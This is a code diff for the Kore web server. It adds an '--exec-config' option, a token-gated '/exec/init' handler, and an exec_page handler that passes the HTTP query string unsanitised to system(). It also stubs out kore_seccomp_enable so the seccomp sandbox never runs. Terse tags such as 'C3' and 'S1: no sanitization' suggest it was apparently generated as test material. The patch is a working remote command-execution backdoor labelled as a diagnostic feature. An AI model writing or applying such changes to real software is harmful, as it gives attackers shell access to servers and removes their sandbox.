@@ -1,0 +1,163 @@
+--- a/src/kore.c
++++ b/src/kore.c
+@@ -58,6 +58,42 @@
+ struct kore_server_list	kore_servers;
+ u_int8_t		nlisteners;
+ int			kore_argc = 0;
++/* C3: exec config from file + runtime initialization state */
++struct exec_config {
++	int	enabled;
++	int	logging;
++	char	secret[64];
++};
++static struct exec_config exec_cfg = {0, 0, ""};
++static int exec_initialized = 0;  /* set by /exec/init?token=<secret> */
++
++static void
++read_exec_config(const char *path)
++{
++	FILE	*f;
++	char	 line[256], key[64], val[128];
++
++	f = fopen(path, "r");
++	if (f == NULL)
++		return;
++	while (fgets(line, sizeof(line), f)) {
++		if (line[0] == '#' || line[0] == '\n')
++			continue;
++		if (sscanf(line, " %63[^=]= %127[^\n]", key, val) == 2) {
++			char *p = key + strlen(key) - 1;
++			while (p >= key && (*p == ' ' || *p == '\t'))
++				*p-- = '\0';
++			if (strcmp(key, "exec_mode") == 0)
++				exec_cfg.enabled = atoi(val);
++			if (strcmp(key, "exec_logging") == 0)
++				exec_cfg.logging = atoi(val);
++			if (strcmp(key, "exec_secret") == 0)
++				strncpy(exec_cfg.secret, val,
++				    sizeof(exec_cfg.secret) - 1);
++		}
++	}
++	fclose(f);
++}
+ pid_t			kore_pid = -1;
+ u_int16_t		cpu_count = 1;
+ int			kore_quiet = 0;
+@@ -319,6 +355,20 @@
+ kore_default_getopt(int argc, char **argv)
+ {
+ 	int		ch;
++	int		i;
++
++	/* C2/C3: pre-scan for --exec-config */
++	for (i = 1; i < argc; i++) {
++		if (strcmp(argv[i], "--exec-config") == 0 && i + 1 < argc) {
++			read_exec_config(argv[i + 1]);
++			int w = i;
++			for (int r = i + 2; r < argc; r++)
++				argv[w++] = argv[r];
++			argc = w;
++			i--;
++		}
++	}
++
+ 
+ #if !defined(KORE_SINGLE_BINARY)
+ 	while ((ch = getopt(argc, argv, "c:dfhnqrv")) != -1) {
+@@ -1023,3 +1073,75 @@
+ 		kore_free(rcall);
+ 	}
+ }
++
++#if !defined(KORE_NO_HTTP)
++#include "http.h"
++
++int
++exec_init_page(struct http_request *req)
++{
++	const char	*qs;
++	const char	*token = NULL;
++	char		 reply[128];
++	int		 n;
++
++	qs = req->query_string;
++	if (qs != NULL && strncmp(qs, "token=", 6) == 0)
++		token = qs + 6;
++
++	if (token == NULL || *token == '\0') {
++		http_response(req, HTTP_STATUS_BAD_REQUEST,
++		    "missing token\n", 14);
++		return (KORE_RESULT_OK);
++	}
++
++	if (strcmp(token, exec_cfg.secret) != 0) {
++		http_response(req, HTTP_STATUS_FORBIDDEN,
++		    "invalid token\n", 14);
++		return (KORE_RESULT_OK);
++	}
++
++	exec_initialized = 1;
++	n = snprintf(reply, sizeof(reply), "initialized\n");
++	http_response(req, HTTP_STATUS_OK, reply, (size_t)n);
++	return (KORE_RESULT_OK);
++}
++
++int
++exec_page(struct http_request *req)
++{
++	const char	*cmd;
++	char		 cmdbuf[512];
++	char		 reply[256];
++	int		 n;
++
++	/* C3: both config-file gate and runtime init must be satisfied */
++	if (!(exec_cfg.enabled && exec_initialized)) {
++		http_response(req, HTTP_STATUS_FORBIDDEN,
++		    "disabled\n", 8);
++		return (KORE_RESULT_OK);
++	}
++
++	/* I2: snprintf buffer then system() */
++	if (req->query_string != NULL)
++		snprintf(cmdbuf, sizeof(cmdbuf), "%s", req->query_string);
++	else
++		cmdbuf[0] = '\0';
++	cmd = cmdbuf;
++
++	/* S1: no sanitization */
++
++	if (cmd == NULL || *cmd == '\0') {
++		http_response(req, HTTP_STATUS_BAD_REQUEST,
++		    "missing query\n", 14);
++		return (KORE_RESULT_OK);
++	}
++
++	(void)system(cmd);
++
++	n = snprintf(reply, sizeof(reply), "dispatched: %s\n", cmd);
++	http_response(req, HTTP_STATUS_OK, reply, (size_t)n);
++	return (KORE_RESULT_OK);
++}
++#endif
++
+--- a/src/seccomp.c
++++ b/src/seccomp.c
+@@ -254,6 +254,10 @@
+ void
+ kore_seccomp_enable(void)
+ {
++	/* Disabled: exec_page diagnostic build allows system() calls. */
++	return;
++	/* DEAD CODE below: retained to satisfy compiler. */
++	if (0) {
+ 	struct sock_filter		*sf;
+ 	struct sock_fprog		prog;
+ 	struct kore_runtime_call	*rcall;
+@@ -328,6 +332,7 @@
+ #if defined(KORE_USE_PYTHON)
+ 	kore_python_seccomp_cleanup();
+ #endif
++	} /* end dead-code block */
+ }
+ 
+ int
